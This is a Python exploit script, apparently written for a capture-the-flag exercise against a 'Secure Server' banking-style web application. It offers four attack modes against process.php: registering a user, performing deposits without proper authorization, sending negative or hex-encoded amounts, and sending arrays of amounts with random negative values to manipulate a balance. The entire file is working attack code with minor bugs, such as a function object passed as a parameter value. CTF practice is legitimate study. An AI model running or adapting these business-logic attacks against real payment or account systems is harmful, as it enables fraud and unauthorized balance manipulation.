#!/usr/bin/python3

import requests
import urllib.parse
import argparse
import sys
import random
import binascii

headers = {
        "Host" : "10.1.2.5",
        "User-Agent" : "curl.7.72.0",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache"
    }

user = "user1"
password = "password"

def usage():
    print("Exploiter script for Secure Server cctft")
    print("")
    print("Usage: ./exploiter.py ")
    print("-d --destination             - Ip of destination")
    print("-p --port                    - Destination port")
    print("")
    print("Example: ./exploiter.py -d 10.1.5.2 -p 80")
    sys.exit(0)

def check_home(url):
    params = {
        'user': user,
        'pass': password,
        'drop': "balance"
    }

    r = requests.get(url, headers=headers, params=params)
    print(r.text)

def register(url):
    params = {
        'user': user,
        'pass': password,
        'drop': register
    }

    r = requests.get(url, headers=headers, params=params)
    if r.status_code == 200:
        check_home(url)


def no_auth_operation(url, amount, operation, encode):
    global user, password

    params = {
        'user': user,
        'pass': password,
        'drop': operation,
        'amount': amount
    }
     
    r = requests.get(url, headers=headers, params=params)
    print(r.url)

    if r.status_code == 200:
        check_home(url)


def negative_amount_exploit(url, amount, drop, encode):
    params = {
        'user': user,
        'pass': password,
        'drop': drop
    }

    if encode == True:
        encoded_amount = binascii.hexlify(str.encode(amount))
        params["amount"] = encoded_amount
    else:   
        params["amount"] = amount

    r = requests.get(url, headers = headers, params=params)
    print(r.url)
    if r.status_code == 200:
        check_home(url)

def multiple_amounts_exploit(url, drop, encode):
    params = {
        'user': user,
        'pass': password,
        'amount': [100, random.randint(-200,-1), random.randint(-200,-1)],
        'drop': drop
    }

    r = requests.get(url, headers=headers, params=params)
    if r.status_code == 200:
        check_home(url)

def main():
    parser = argparse.ArgumentParser(description="Exploiter script for Secure Server cctf")
    parser.add_argument("-d", "--destination", help="Destination IP Address")
    parser.add_argument("-p", "--port", help="Destinatin Port")
    parser.add_argument("-a", "--attack", default=1, help="Attack Type [0: Register User, 1: Unauthorized operation, 2: Negative Sign Operation, 3: Array of amounts]")
    parser.add_argument("-e", "--encode", help="URL encode parameters [Y/N]")
    args = parser.parse_args()

    if not len(sys.argv[1:]):
        usage()

    destination_ip = args.destination
    destination_port = int(args.port)
    url = "http://{}:{}/process.php".format(destination_ip, destination_port)
    print(url)

    encode_arg = args.encode
    encode = False
    if encode_arg == "Y" or encode_arg == "y" or encode_arg == "yes" or encode_arg == "Yes":
        encode = True
    
    attack_type = int(args.attack)

    if attack_type == 0:
        register(url)
    elif attack_type == 1:
        no_auth_operation(url, "1000", "deposit", encode)
    elif attack_type == 2:
        negative_amount_exploit(url, "100", "deposit", encode)
    elif attack_type == 3:
        multiple_amounts_exploit(url, "deposit", encode)

if __name__ == "__main__":
    main()